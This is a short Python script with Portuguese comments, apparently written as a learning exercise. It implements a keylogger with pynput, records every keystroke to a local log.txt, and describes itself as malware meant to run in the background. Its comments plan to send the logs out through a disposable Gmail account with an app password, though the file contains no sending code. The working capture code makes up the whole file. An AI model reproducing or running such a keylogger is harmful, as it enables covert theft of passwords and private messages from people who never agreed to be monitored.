from pynput import keyboard

# Vamos de Keylogger
# Malware que registra teclado
# Executar em segundo plano
# toda vez que digitar uma tecla a tecla deve ser salva

# Para a comunicaçõa usamos o Gmail, pois ele tem port para app
# usamos um Gmail discartavel, e fazemos o passo a passo de como aplicativos externos podem fazer comunicação via email
# entre em: http://myacount.google.com/apppassword

IGNOARA = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key):
    try:
    #Se for uma Tecla valida
        with open("log.txt","a",encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt","a",encoding="utf-8")as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.esc:
                f.write("  [ESC]  ")
            elif key in IGNOARA:
                pass
            else:
                f.write(f"[{key}] ")
with keyboard.Listener(on_press = on_press) as listener:
        listener.join()



